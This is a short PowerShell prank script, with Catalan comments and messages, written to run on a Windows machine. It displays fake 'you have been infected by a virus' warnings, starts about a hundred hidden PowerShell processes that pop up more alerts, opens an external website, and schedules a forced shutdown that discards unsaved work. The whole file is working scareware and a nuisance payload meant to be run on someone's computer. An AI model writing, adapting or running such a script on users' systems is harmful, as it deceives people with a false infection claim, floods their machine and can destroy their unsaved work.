#importa llibreria missatges
Add-Type -AssemblyName "System.Windows.Forms"

# Function to show a message box
function Show-MessageBox {
    [System.Windows.Forms.MessageBox]::Show("Has sigut infectat per un virus lassalllista", "Alert", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
}

######################

Start-Job -ScriptBlock {
    Start-Sleep -Seconds 45
    Stop-Computer -Force
}


Start-Sleep -Seconds 2

[System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)

Start-Sleep -Seconds 2
for ($i = 0; $i -lt 1; $i++) {
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
}
[System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)

Start-Sleep -Seconds 2
Start-Process "https://qr.carquinyolis.cat"

for ($i = 0; $i -lt 50; $i++) {
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
}
[System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
for ($i = 0; $i -lt 50; $i++) {
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoExit", "-WindowStyle Hidden", "-Command", "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('Has sigut infectat per un virus lassalllista', 'Alert', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)"
}
######################


try {
    $eject = New-Object -ComObject Shell.Application
    $eject.NameSpace("shell:::{645FF040-5081-101B-9F08-00AA002F954E}").Items() | ForEach-Object { $_.InvokeVerb('Eject') }
}
catch {
    Write-Host "No hi ha disquetera"
}

# Uncomment the line below if you want the computer to shut down after
Start-Sleep -Seconds 5
Stop-Computer
